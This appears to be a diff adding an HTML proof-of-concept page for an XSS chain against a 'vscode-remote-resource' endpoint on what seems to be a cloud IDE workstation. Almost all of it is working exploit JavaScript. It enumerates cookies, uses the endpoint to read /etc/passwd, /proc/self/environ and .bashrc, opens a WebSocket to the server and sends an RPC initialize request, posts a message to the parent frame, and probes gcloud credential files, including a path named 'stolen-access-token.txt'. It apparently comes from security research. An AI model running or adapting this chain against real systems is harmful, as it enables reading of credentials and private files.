@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS Chain PoC</title></head>
+<body>
+<h2>vscode-remote-resource XSS Chain Test</h2>
+<pre id="log"></pre>
+<script>
+var log = document.getElementById('log');
+function l(msg) { log.textContent += msg + '\n'; }
+
+l('[*] Running on: ' + location.origin);
+l('[*] document.domain: ' + document.domain);
+
+l('\n=== Cookie Analysis ===');
+var cookies = document.cookie;
+l('[*] Cookie length: ' + cookies.length);
+if (cookies.length > 0) {
+  var parts = cookies.split(';');
+  parts.forEach(function(c) {
+    var name = c.trim().split('=')[0];
+    var valLen = (c.trim().split('=')[1] || '').length;
+    l('[*] Cookie: ' + name + ' (value length: ' + valLen + ')');
+  });
+}
+
+l('\n=== Environment Probe ===');
+l('[*] User-Agent: ' + navigator.userAgent.substring(0, 80));
+l('[*] Referrer: ' + document.referrer);
+l('[*] Ancestors: ' + (window !== window.top ? 'in iframe' : 'top-level'));
+
+l('\n=== Same-Origin File Read Test ===');
+var filesToRead = [
+  '/vscode-remote-resource?path=/etc/hostname',
+  '/vscode-remote-resource?path=/etc/passwd',
+  '/vscode-remote-resource?path=/home/user/.bashrc',
+  '/vscode-remote-resource?path=/proc/self/environ'
+];
+
+filesToRead.forEach(function(path) {
+  var fullUrl = location.origin + path;
+  fetch(fullUrl, {credentials: 'include'})
+    .then(function(r) {
+      return r.text().then(function(t) {
+        l('[READ] ' + path.split('path=')[1] + ': ' + r.status + ' | ' + t.substring(0, 100));
+      });
+    })
+    .catch(function(e) {
+      l('[READ] ' + path.split('path=')[1] + ': FAILED - ' + e.message);
+    });
+});
+
+l('\n=== WebSocket Test (same-origin) ===');
+setTimeout(function() {
+  try {
+    var wsUrl = (location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/?skipWebSocketFrames=false';
+    l('[WS] Connecting to: ' + wsUrl);
+    var ws = new WebSocket(wsUrl);
+
+    ws.onopen = function() {
+      l('[WS] CONNECTED! readyState=' + ws.readyState);
+
+      var rpcMsg = JSON.stringify({
+        "seq": 1,
+        "type": "request",
+        "command": "initialize"
+      });
+      ws.send(rpcMsg);
+      l('[WS] Sent initialize request');
+    };
+
+    ws.onmessage = function(e) {
+      var data = typeof e.data === 'string' ? e.data.substring(0, 300) : '(binary)';
+      l('[WS] Response: ' + data);
+    };
+
+    ws.onerror = function() { l('[WS] Connection error'); };
+    ws.onclose = function(e) { l('[WS] Closed: code=' + e.code); };
+  } catch(ex) {
+    l('[WS] Exception: ' + ex.message);
+  }
+}, 2000);
+
+l('\n=== postMessage to parent (idx.google.com) ===');
+if (window !== window.top) {
+  try {
+    window.top.postMessage({type: 'xss-poc', origin: location.origin, msg: 'XSS on workstation domain'}, '*');
+    l('[PM] Sent postMessage to parent');
+  } catch(e) {
+    l('[PM] postMessage failed: ' + e.message);
+  }
+}
+
+l('\n=== Credential File Probe ===');
+setTimeout(function() {
+  var credPaths = [
+    '/home/user/.config/gcloud/credentials.db',
+    '/home/user/.config/gcloud/application_default_credentials.json',
+    '/home/user/.config/gcloud/properties',
+    '/tmp/.fbs-evidence/stolen-access-token.txt'
+  ];
+
+  credPaths.forEach(function(p) {
+    fetch(location.origin + '/vscode-remote-resource?path=' + encodeURIComponent(p), {credentials: 'include'})
+      .then(function(r) {
+        l('[CRED] ' + p.split('/').pop() + ': status=' + r.status + ' size=' + r.headers.get('content-length'));
+      })
+      .catch(function(e) {
+        l('[CRED] ' + p.split('/').pop() + ': ' + e.message);
+      });
+  });
+}, 4000);
+</script>
+</body>
+</html>
